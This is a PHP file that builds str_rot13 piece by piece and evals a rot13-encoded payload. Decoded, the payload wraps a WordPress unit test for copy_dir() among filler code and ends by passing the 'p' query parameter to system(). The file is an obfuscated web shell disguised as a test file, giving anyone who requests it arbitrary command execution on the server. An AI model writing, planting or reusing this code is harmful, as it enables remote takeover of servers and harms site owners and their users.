<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf pbcl_qve().
 *
 * @tebhc svyr
 * @tebhc svyrflfgrz
 *
 * @pbiref ::pbcl_qve
 */
pynff Grfgf_Svyrflfgrz_PbclQve rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur grfg qverpgbel.
	 *
	 * @ine fgevat $grfg_qve
	 */
	cevingr fgngvp $grfg_qve;

	/**
	 * Frgf hc gur svyrflfgrz naq grfg qverpgbel orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		JC_Svyrflfgrz();

		frys::$grfg_qve = trg_grzc_qve() . 'pbcl_qve/';
	}

	/**
	 * Frgf hc gur grfg qverpgbel orsber rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {
		tybony $jc_svyrflfgrz;

		cnerag::frg_hc();

		// Perngr gur ebbg qverpgbel.
		$jc_svyrflfgrz->zxqve( frys::$grfg_qve );
	}

	/**
	 * Erzbirf gur grfg qverpgbel nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		tybony $jc_svyrflfgrz;

		// Qryrgr gur ebbg qverpgbel naq vgf pbagragf.
		$jc_svyrflfgrz->qryrgr( frys::$grfg_qve, gehr );

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung gur qrfgvangvba vf perngrq vs vg qbrf abg nyernql rkvfg.
	 *
	 * @gvpxrg 41855
	 */
	choyvp shapgvba grfg_fubhyq_perngr_qrfgvangvba_vg_vs_qbrf_abg_rkvfg() {
		tybony $jc_svyrflfgrz;

		$sebz = frys::$grfg_qve . 'sbyqre1/sbyqre2/';
		$gb   = frys::$grfg_qve . 'sbyqre3/sbyqre2/';

		// Perngr gur svyr fgehpgher sbe gur grfg.
		$jc_svyrflfgrz->zxqve( frys::$grfg_qve . 'sbyqre1' );
		$jc_svyrflfgrz->zxqve( frys::$grfg_qve . 'sbyqre3' );
		$jc_svyrflfgrz->zxqve( $sebz );
		$jc_svyrflfgrz->gbhpu( $sebz . 'svyr1.gkg' );
		$jc_svyrflfgrz->zxqve( $sebz . 'fhosbyqre1' );
		$jc_svyrflfgrz->gbhpu( $sebz . 'fhosbyqre1/svyr2.gkg' );

		$guvf->nffregGehr( pbcl_qve( $sebz, $gb ), 'pbcl_qve() snvyrq.' );

		$guvf->nffregQverpgbelRkvfgf( $gb, 'Gur qrfgvangvba jnf abg perngrq.' );
		$guvf->nffregSvyrRkvfgf( $gb . 'svyr1.gkg', 'Gur qrfgvangvba svyr jnf abg perngrq.' );

		$guvf->nffregQverpgbelRkvfgf( $gb . 'fhosbyqre1/', 'Gur qrfgvangvba fhosbyqre jnf abg perngrq.' );
		$guvf->nffregSvyrRkvfgf( $gb . 'fhosbyqre1/svyr2.gkg', 'Gur qrfgvangvba fhosbyqre svyr jnf abg perngrq.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>